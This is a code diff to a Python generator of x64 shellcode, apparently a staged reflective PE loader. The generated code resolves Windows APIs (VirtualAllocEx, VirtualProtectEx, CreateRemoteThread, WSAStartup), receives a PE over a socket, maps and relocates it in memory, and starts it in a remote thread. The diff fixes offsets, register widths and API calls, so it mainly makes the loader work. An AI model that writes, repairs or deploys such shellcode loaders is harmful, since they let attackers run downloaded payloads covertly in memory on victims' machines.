@@ -67,7 +67,7 @@ class Shellcode():
                 "LoadLibraryA",
                 "VirtualAllocEx",
                 "GetProcAddress",
-                "VirtualProtect",
+                "VirtualProtectEx",
                 "CreateRemoteThread",
                 "WaitForSingleObject",
             ],
@@ -91,8 +91,8 @@ class Shellcode():
             "GetCurrentProcess"             : 0x088,
             "LoadLibraryA"                  : 0x098,
             "VirtualAllocEx"                : 0x030,
-            "GetProcAddress"                : 0x150,
-            "VirtualProtect"                : 0x140,
+            "GetProcAddress"                : 0x110,
+            "VirtualProtectEx"              : 0x140,
             "CreateRemoteThread"            : 0x160,
             "WaitForSingleObject"           : 0x168,
             "WSAStartup"                    : 0x070,
@@ -110,17 +110,17 @@ class Shellcode():
             "sockaddr_name"                 : 0x220,
             "sockfd"                        : 0x068,
             "buffer"                        : 0x060,
-            "pResponse"                     : 0x070,
+            "pResponse"                     : 0x190,
             "pTmpResponse"                  : 0x058,
             "bytesRead"                     : 0x078,
-            "hProcess"                      : 0x088,
-            "pNtHeader"                     : 0x050,
-            "lpvLoadedAddress"              : 0x078,
-            "lpvNewAllocatedBase"           : 0x078,
+            "hProcess"                      : 0x170,
+            "pNtHeader"                     : 0x150,
+            "lpvLoadedAddress"              : 0x180,
+            "lpvNewAllocatedBase"           : 0x180,
             "dwOffsetToBaseRelocationTable" : 0x090,
             "pHeaderSection"                : 0x028,
             "dwTableSize"                   : 0x038,
-            "lpvPEBytes"                    : 0x070,
+            "lpvPEBytes"                    : 0x190,
             "pBaseRelocationTable"          : 0x200,
             "dwBlockSize"                   : 0x090,
             "pwRelocEntry"                  : 0x220,
@@ -129,18 +129,18 @@ class Shellcode():
             "dwAddressOffset"               : 0x208,
             "lpvPreferableBase"             : 0x100,
             "dwImportsOffset"               : 0x038,
-            "lpvFileContent"                : 0x070,
+            "lpvFileContent"                : 0x190,
             "lpImportData"                  : 0x220,
             "szDllName"                     : 0x090,
             "hLibraryHandle"                : 0x218,
             "dwFThunk"                      : 0x210,
             "lpApiImport"                   : 0x208,
             "stWrittenBytes"                : 0x038,
-            "lpAllocatedBase"               : 0x078,
+            "lpAllocatedBase"               : 0x180,
             "lpSectionHeaderArray"          : 0x210,
-            "dwSectionMappedSize"           : 0x038,
+            "dwSectionMappedSize"           : 0x250,
             "dwSectionProtection"           : 0x090,
-            "dwSecIndex"                    : 0x218,
+            "dwSecIndex"                    : 0x200,
         }
 
         self.static_variables = {
@@ -682,7 +682,7 @@ alloc_pe_home:
     mov [r15 + {self.storage_offsets['pNtHeader']}], r8
     add r8, {self.struct_def_IMAGE_NT_HEADERS["OptionalHeader"]}
     xor rdx, rdx
-    mov dx, [r8 + {self.struct_def_IMAGE_OPTIONAL_HEADER["SizeOfImage"]}]
+    mov edx, [r8 + {self.struct_def_IMAGE_OPTIONAL_HEADER["SizeOfImage"]}]
     mov r8, rdx
     mov r9, {self.static_variables['PAGE_EXECUTE_READWRITE']}
     mov [rsp + 0x20], r9
@@ -895,7 +895,7 @@ no_reloc:
 
         stub = f"""
 ; RAX = rvaToOffset(PIMAGE_NT_HEADERS64 pNtHeader, // RCX => lpNtHeader
-;                   DWORD dwVA);                   // RDX => lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
+;                   DWORD dwVA);                   // R11 => lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
 get_dwImportsOffset:
     xor r11, r11
     mov rdx, [r15 + {self.storage_offsets['pNtHeader']}]
@@ -926,6 +926,8 @@ get_szDllName:
     xor r11, r11
     add rdx, {self.struct_def_IMAGE_IMPORT_DESCRIPTOR['Name']}
     mov r11d, [rdx]
+    cmp r11, 0x00
+    je check_dll_done
     mov rcx, [r15 + {self.storage_offsets['pNtHeader']}]
     call rva2offset
     mov rdx, [r15 + {self.storage_offsets['lpvFileContent']}]
@@ -1020,25 +1022,24 @@ copy_to_alloc:
     mov rdx, [r15 + {self.storage_offsets['lpvFileContent']}]
     call rax
 
-; RAX = VirtualProtect([in]  HANDLE hProcess,        // RCX        => hProcess
-;                      [in]  LPVOID lpAddress,       // RDX        => lpAllocatedBase
-;                      [in]  SIZE_T dwSize,          // R8         => lpNtHeader->OptionalHeader.SizeOfHeaders
-;                      [in]  DWORD  flNewProtect,    // R9         => PAGE_READONLY
-;                      [out] PDWORD lpflOldProtect); // [RSP+0x20] => NULL
+; RAX = VirtualProtectEx([in]  HANDLE hProcess,        // RCX        => hProcess
+;                        [in]  LPVOID lpAddress,       // RDX        => lpAllocatedBase
+;                        [in]  SIZE_T dwSize,          // R8         => lpNtHeader->OptionalHeader.SizeOfHeaders
+;                        [in]  DWORD  flNewProtect,    // R9         => PAGE_READONLY
+;                        [out] PDWORD lpflOldProtect); // [RSP+0x20] => NULL
 change_permissions:
     xor rdx, rdx
-    mov rcx, [r15 + {self.storage_offsets['lpAllocatedBase']}]
     mov r11, [r15 + {self.storage_offsets['pNtHeader']}]
     add r11, {self.struct_def_IMAGE_NT_HEADERS['OptionalHeader']}
-    mov dx, [r11 + {self.struct_def_IMAGE_OPTIONAL_HEADER['SizeOfHeaders']}]
-    mov rax, [r15 + {self.storage_offsets['VirtualProtect']}]
-    mov r11, 0x02
-    mov r8, r11
-    xor r11, r11
-    mov [rsp+0x20], r11
+    mov edx, [r11 + {self.struct_def_IMAGE_OPTIONAL_HEADER['SizeOfHeaders']}]
+    mov rax, [r15 + {self.storage_offsets['VirtualProtectEx']}]
+    mov r8, rdx
+    mov rdx, [r15 + {self.storage_offsets['lpAllocatedBase']}]
     mov r11, rsp
-    add r11, 0x20
-    mov r9, r11
+    add rsp, 0x28
+    mov [rsp+0x20], r11
+    mov rcx, [r15 + {self.storage_offsets['hProcess']}]
+    mov r9, 0x02
     call rax
         """
 
@@ -1059,7 +1060,7 @@ get_lpSectionHeaderArray:
     mov rcx, [r15 + {self.storage_offsets['lpvFileContent']}]
     add rcx, rdx
     add rcx, 0x108
-    mov [r15 + {self.storage_offsets['lpSectionHeaderArray']}], rcx
+    mov [r15 + {self.storage_offsets['lpSectionHeaderArray']}], rcx ; bu 00000240`19a506de "da rcx ; g"
 
 ; for (DWORD dwSecIndex = 0; dwSecIndex < lpNtHeader->FileHeader.NumberOfSections; dwSecIndex++, lpSectionHeaderArray++)
 init_dwSecIndex:
@@ -1089,7 +1090,7 @@ copy_section:
     add rdx, r14
     mov r8, r13
     mov rax, [r15 + {self.storage_offsets['memcpy']}]
-    call rax
+    call rax ; bu 00000214`c27106da ".printf \"memcpy(%p, %p, %p)\\n\", rcx, rdx, r8 ; g"
 
 ; DWORD dwSectionMappedSize = 0;
 ; if (dwSecIndex == lpNtHeader->FileHeader.NumberOfSections - 1) {{
@@ -1103,6 +1104,7 @@ get_mapped_section_size:
     mov [r15 + {self.storage_offsets['dwSectionMappedSize']}], rax
     mov rdx, [r15 + {self.storage_offsets['pNtHeader']}]
     add rdx, {self.struct_def_IMAGE_NT_HEADERS["FileHeader"]}
+    add rdx, {self.struct_def_IMAGE_FILE_HEADER["NumberOfSections"]}
     mov ax, [rdx]
     dec al
     mov rcx, [r15 + {self.storage_offsets['dwSecIndex']}]
@@ -1110,16 +1112,17 @@ get_mapped_section_size:
     jne next_section
 
 last_section:
+    xor rcx, rcx
+    mov rdx, [r15 + {self.storage_offsets['lpSectionHeaderArray']}]
+    add rdx, {self.struct_def_IMAGE_SECTION_HEADER['VirtualAddress']}
+    mov ecx, [rdx]
     xor rdx, rdx
     mov r11, [r15 + {self.storage_offsets['pNtHeader']}]
     add r11, {self.struct_def_IMAGE_NT_HEADERS['OptionalHeader']}
-    mov dx, [r11 + {self.struct_def_IMAGE_OPTIONAL_HEADER['SizeOfHeaders']}] 
-    xor r11, r11
-    mov rdx, [r15 + {self.storage_offsets['lpSectionHeaderArray']}]
-    add rdx, {self.struct_def_IMAGE_SECTION_HEADER['VirtualAddress']}
-    mov r11d, [rdx] ; lpSectionHeaderArray->VirtualAddress
-    sub rdx, r11
-    mov [r15 + {self.storage_offsets['dwSectionMappedSize']}], r11
+    mov edx, [r11 + {self.struct_def_IMAGE_OPTIONAL_HEADER['SizeOfImage']}]
+    sub rdx, rcx
+    mov [r15 + {self.storage_offsets['dwSectionMappedSize']}], rdx
+    jmp page_execute_read_write
 
 next_section:
     xor r11, r11
@@ -1252,16 +1255,16 @@ change_perm:
     xor r11, r11
     mov rdx, [r15 + {self.storage_offsets['lpSectionHeaderArray']}]
     add rdx, {self.struct_def_IMAGE_SECTION_HEADER['VirtualAddress']}
-    mov r11d, [rdx] ; lpSectionHeaderArray->VirtualAddress
+    mov r11d, [rdx]
     mov rdx, [r15 + {self.storage_offsets['lpAllocatedBase']}]
     add rdx, r11
-    mov rcx, rdx
-    mov rdx, [r15 + {self.storage_offsets['dwSectionMappedSize']}]
-    mov r8, [r15 + {self.storage_offsets['dwSectionProtection']}]
+    mov rcx, [r15 + {self.storage_offsets['hProcess']}]
+    mov r8, [r15 + {self.storage_offsets['dwSectionMappedSize']}]
+    mov r9, [r15 + {self.storage_offsets['dwSectionProtection']}]
     mov r11, rsp
-    add r11, 0x20
-    mov r9, r11
-    mov rax, [r15 + {self.storage_offsets['VirtualProtect']}]
+    add rsp, 0x28
+    mov [rsp+0x20], r11
+    mov rax, [r15 + {self.storage_offsets['VirtualProtectEx']}]
     call rax
 
 check_next_section:
@@ -1269,7 +1272,7 @@ check_next_section:
     inc cl
     mov [r15 + {self.storage_offsets['dwSecIndex']}], rcx
     mov rdx, [r15 + {self.storage_offsets['lpSectionHeaderArray']}]
-    add rdx, 0x28 ; sizeof(IMAGE_SECTION_HEADER) 
+    add rdx, 0x28
     mov [r15 + {self.storage_offsets['lpSectionHeaderArray']}], rdx
     xor r9, r9
     mov r8, [r15 + {self.storage_offsets['pNtHeader']}]
@@ -1318,15 +1321,15 @@ stackAlign:
 ;                           [in]  DWORD                  dwCreationFlags,    // [RSP+0x28] => 0x00
 ;                           [out] LPDWORD                lpThreadId);        // [RSP+0x30] => NULL
 execute_pe:
-    xor rdx, rdx
-    
     xor r9, r9
     mov r8, [r15 + {self.storage_offsets['pNtHeader']}]
     add r8, {self.struct_def_IMAGE_NT_HEADERS['OptionalHeader']}
-    mov r9w, [r8 + {self.struct_def_IMAGE_OPTIONAL_HEADER['AddressOfEntryPoint']}]
+    mov r9d, [r8 + {self.struct_def_IMAGE_OPTIONAL_HEADER['AddressOfEntryPoint']}]
+
     mov rcx, [r15 + {self.storage_offsets['lpvLoadedAddress']}]
     add rcx, r9
     mov r9, rcx
+    xor rdx, rdx
     mov [rsp + 0x20], rdx
     mov [rsp + 0x28], rdx
     mov [rsp + 0x30], rdx
@@ -1343,7 +1346,6 @@ wait:
     dec dl
     mov rax, [r15 + {self.storage_offsets['WaitForSingleObject']}]
     call rax
-
     ret
         """
 
